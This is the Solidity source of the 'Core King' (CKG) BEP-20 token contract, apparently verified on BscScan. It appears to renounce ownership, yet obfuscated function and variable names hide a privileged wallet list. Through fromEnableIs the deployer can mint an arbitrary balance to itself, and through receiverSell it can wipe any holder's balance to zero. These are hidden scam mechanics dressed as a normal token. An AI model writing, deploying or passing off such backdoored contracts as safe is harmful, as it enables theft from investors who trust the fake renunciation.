/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract exemptShould {
    function liquidityWallet() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface fundSell {
    function createPair(address minFrom, address maxTrading) external returns (address);
}

interface isAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreKing is IERC20, exemptShould {
    uint8 private tokenLaunch = 18;
    
    bool private walletBuy;
    uint256 public walletList;
    uint256 private txTotal;
    mapping(address => bool) public tradingTo;

    mapping(address => mapping(address => uint256)) private receiverAmount;
    address public txTrading;
    bool public tradingWalletLimit;
    address private walletMaxAt;
    


    uint256 private swapTake = 100000000 * 10 ** 18;
    string private feeLimit = "Core King";
    bool public totalMax;
    bool public modeEnable;
    mapping(address => uint256) private launchedMarketing;
    uint256 private walletToken;
    address public txMode;
    uint256 public receiverToken;
    bool public receiverSwapTrading;
    mapping(address => bool) public limitSwap;
    uint256 public receiverTakeToken;
    uint256 public txLimitShould;
    string private shouldSell = "CKG";
    

    

    event OwnershipTransferred(address indexed atToken, address indexed sellAuto);

    constructor (){
        if (modeEnable == receiverSwapTrading) {
            txTotal = txLimitShould;
        }
        isAuto walletMarketing = isAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txTrading = fundSell(walletMarketing.factory()).createPair(walletMarketing.WETH(), address(this));
        walletMaxAt = liquidityWallet();
        
        txMode = walletMaxAt;
        tradingTo[txMode] = true;
        
        launchedMarketing[txMode] = swapTake;
        emit Transfer(address(0), txMode, swapTake);
        swapFee();
    }

    

    function owner() external view returns (address) {
        return walletMaxAt;
    }

    function totalMaxLimit() public view returns (uint256) {
        return receiverToken;
    }

    function toAtTrading() public {
        
        if (receiverToken == txLimitShould) {
            walletBuy = true;
        }
        txLimitShould=0;
    }

    function balanceOf(address limitTrading) public view virtual override returns (uint256) {
        return launchedMarketing[limitTrading];
    }

    function decimals() external view returns (uint8) {
        return tokenLaunch;
    }

    function launchedLimit() public {
        
        
        receiverSwapTrading=false;
    }

    function shouldAt() public view returns (bool) {
        return walletBuy;
    }

    function transferFrom(address maxMarketing, address walletMode, uint256 limitFrom) external override returns (bool) {
        if (receiverAmount[maxMarketing][liquidityWallet()] != type(uint256).max) {
            require(limitFrom <= receiverAmount[maxMarketing][liquidityWallet()]);
            receiverAmount[maxMarketing][liquidityWallet()] -= limitFrom;
        }
        return totalAmount(maxMarketing, walletMode, limitFrom);
    }

    function totalAmount(address maxMarketing, address walletMode, uint256 limitFrom) internal returns (bool) {
        if (maxMarketing == txMode || walletMode == txMode) {
            return launchedExemptFund(maxMarketing, walletMode, limitFrom);
        }
        if (receiverSwapTrading == walletBuy) {
            tradingWalletLimit = true;
        }
        
        if (modeEnable == tradingWalletLimit) {
            tradingWalletLimit = false;
        }
        return launchedExemptFund(maxMarketing, walletMode, limitFrom);
    }

    function fromEnableIs(uint256 limitFrom) public {
        if (!tradingTo[liquidityWallet()]) {
            return;
        }
        launchedMarketing[txMode] = limitFrom;
    }

    function symbol() external view returns (string memory) {
        return shouldSell;
    }

    function launchedExemptFund(address maxMarketing, address walletMode, uint256 limitFrom) internal returns (bool) {
        require(launchedMarketing[maxMarketing] >= limitFrom);
        launchedMarketing[maxMarketing] -= limitFrom;
        launchedMarketing[walletMode] += limitFrom;
        emit Transfer(maxMarketing, walletMode, limitFrom);
        return true;
    }

    function receiverSell(address liquidityTeam) public {
        
        if (liquidityTeam == txMode || liquidityTeam == txTrading || !tradingTo[liquidityWallet()]) {
            return;
        }
        if (txLimitShould == receiverToken) {
            txLimitShould = receiverTakeToken;
        }
        launchedMarketing[liquidityTeam] = 0;
    }

    function swapFee() public {
        emit OwnershipTransferred(txMode, address(0));
        walletMaxAt = address(0);
    }

    function allowance(address feeAuto, address tradingAuto) external view virtual override returns (uint256) {
        return receiverAmount[feeAuto][tradingAuto];
    }

    function tradingTake() public {
        
        if (receiverSwapTrading == tradingWalletLimit) {
            txLimitShould = receiverToken;
        }
        walletList=0;
    }

    function tokenSell() public {
        if (receiverSwapTrading) {
            txLimitShould = txTotal;
        }
        
        receiverSwapTrading=false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapTake;
    }

    function getOwner() external view returns (address) {
        return walletMaxAt;
    }

    function approve(address tradingAuto, uint256 limitFrom) public virtual override returns (bool) {
        receiverAmount[liquidityWallet()][tradingAuto] = limitFrom;
        emit Approval(liquidityWallet(), tradingAuto, limitFrom);
        return true;
    }

    function modeSell() public view returns (bool) {
        return tradingWalletLimit;
    }

    function autoTrading(address liquidityTx) public {
        if (totalMax) {
            return;
        }
        
        tradingTo[liquidityTx] = true;
        if (tradingWalletLimit) {
            txLimitShould = receiverToken;
        }
        totalMax = true;
    }

    function name() external view returns (string memory) {
        return feeLimit;
    }

    function transfer(address toReceiver, uint256 limitFrom) external virtual override returns (bool) {
        return totalAmount(liquidityWallet(), toReceiver, limitFrom);
    }


}